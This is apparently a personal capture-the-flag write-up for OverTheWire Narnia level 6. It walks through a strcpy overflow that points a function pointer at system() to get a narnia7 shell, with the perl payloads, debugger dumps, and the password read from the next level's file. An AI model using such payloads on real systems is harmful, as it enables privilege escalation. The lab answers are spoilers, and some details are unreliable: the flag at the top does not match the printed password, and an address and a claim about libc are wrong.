## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BufferOverflow #BinaryExploitation
**Completion Date & Time :** 2026 - 05 - 23 / 16:39

---
## FLAG : `Hwsfol90tt`

---
## Solution :

### Step 1 : Check for `narnia6.c` file
```c
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```

From the information above, we could take some points : 
1. `b1` and `b2` could hold 8 bytes.
2. `*fp` is a pointer to a function `puts` and it will take `b1` as the parameters (`fp(b1)`)
3.  The program will clear all **environment** variables and **any extra argv** 
4. The vulnerability in this program is `strcpy` from `b1` and `b2`.
5.  The program has a checking mechanism, which will prevent `*fp` to contain `0xff` in the MSB.
6. It will call `setreuid(geteuid(),geteuid())`, this mean the program will automatically set the `UID` to the *Effective* `UID` of this file (which is `narnia7`).  
### Step 2 : Find `*fp` locations
See this asm dump below : 
```asm
   0x080491e3 <+0>:     push   ebp
   0x080491e4 <+1>:     mov    ebp,esp
   0x080491e6 <+3>:     push   ebx
   0x080491e7 <+4>:     sub    esp,0x18
   0x080491ea <+7>:     mov    DWORD PTR [ebp-0xc],0x8049070
   0x080491f1 <+14>:    cmp    DWORD PTR [ebp+0x8],0x3
```
It we could see, after the program setup, it has a `mov` functions that store `0x08049070` to `ebp-0xc`. This is the instruction for `int (*fp)(char *)=(int(*)(char *))&puts, i;'. 

To verify this, we could put a break at `*main+14` and run this payload (we use `7 bytes` because after adding with `\0` it will become 8 bytes) :
```shell
$(perl -e 'print "A"x7 . " " . "B"x7 ') 
```

Now see the below code : 
```shell
gef➤  p puts
$1 = {<text variable, no debug info>} 0xf7df8a90 <puts>
gef➤  x/x 0x08049070
0x8049070 <puts@plt>:   0xb21425ff
```
Notice that, `0x08049080` is a wrapper for `puts` address. So we have found the location where `*fp` is stored.

### Step 3 : Manipulate the `*fp`
`fp(b1)` is same as `puts(b1)`, this happens because `fp` is a pointer to a function and take `b1` as the parameters. So what if me make the `fp` points to someting else?

Here is the layout of the stack : 
```
Lower addresses
┌──────────────┐
│  b2          │
├──────────────┤
│  b1          │
├──────────────┤
│  *fp         │
└──────────────┘
Higher addresses
```

We need to count the padding between `b1` and `fp` (it should be 0). By putting a break on `*main+258` (which is right after `strcpy(b2,argv[2]);`). 
```shell
gef➤  x/32x $esp
0xffffd354:     0xffffd35c      0xffffd5bb      0x42424242      0x00424242
0xffffd364:     0x41414141      0x00414141      0x08049070      0x00000003
0xffffd374:     0xf7faae34      0x00000000      0xf7da6c75      0x00000003
0xffffd384:     0xffffd434      0xffffd444      0xffffd3a0      0xf7faae34
0xffffd394:     0x080490ed      0x00000003      0xffffd434      0xf7faae34
0xffffd3a4:     0xffffd444      0xf7ffcb60      0x00000000      0xea315a70
0xffffd3b4:     0xa14e3060      0x00000000      0x00000000      0x00000000
0xffffd3c4:     0xf7ffcb60      0x00000000      0xc2e2ba00      0xf7ffda20
gef➤  p $ebp-0xc
$5 = (void *) 0xffffd36c
```

Using the same payload, we know that we don't need extra padding to reach `fp` from `b1`.
*Note :  `$ebp-0xc` is the address where `*fp` is stored*

### Step 3 : Find the `system()` address
The `libc` functions always sit on out stack, so we could just print them : 
```shell
gef➤  p system
$6 = {<text variable, no debug info>} 0xf7dd18e0 <system>
```

### Step 4 : Exploit using `system(/bin/sh)`
First we need to make `*fp` points to `system()` instead of `puts()`. So let's overflow it from `b1`
```shell
$(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7" . " " . "B"x7 ')
```

Check the result : 
```shell
gef➤  x/32x $esp
0xffffd344:     0xffffd34c      0xffffd5bb      0x42424242      0x00424242
0xffffd354:     0x41414141      0x41414141      0xf7dd18e0      0x00000000
```

Now the `*fp` has been replaced, next to spawn the shell, we must make the `system` execute `/bin/sh`. To make this happens, we need to put `/bin/sh` on the `b1`.  But `/bin/sh` only has 7 bytes, we need to put a null terminator after it. But the problem is, we cant just simply add `\x00` in the end of it.
```shell
$(perl -e 'print "/bin/sh\x00" . "\xe0\x18\xdd\xf7" . " " . "B"x7 ')
```
```shell
gef➤  x/32x $esp
0xffffd344:     0xffffd34c      0xffffd5bb      0x42424242      0x00424242
0xffffd354:     0x6e69622f      0xe068732f      0x00f7dd18      0x00000003
```

The null terminator `\x00` is just disappeared. So the solutions is by using the null terminator of `b2`. The idea is to replace `b1` using `b2`.
```shell
$(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7" . " " . "B"x8 . "/bin/sh" ')
```

With this payload, the stack will be : 
```shell
gef➤  x/32x $esp
0xffffd344:     0xffffd34c      0xffffd5b3      0x42424242      0x42424242
0xffffd354:     0x6e69622f      0x0068732f      0xf7dd18e0      0x00000000
```

This is the stack we expected, now we are ready to execute them.

### Step 5 : Execute Payload 
```shell
narnia6@narnia:/narnia$ ./narnia6 $(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7" . " " . "B"x8 . "/bin/sh" ')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
54RtepCEU0
```

---
### Key Takeaways : 



---
## Related Concepts : 
[[setreuid()]], 

---
## Next Challenge :
[[Narnia (7 -> 8)]]
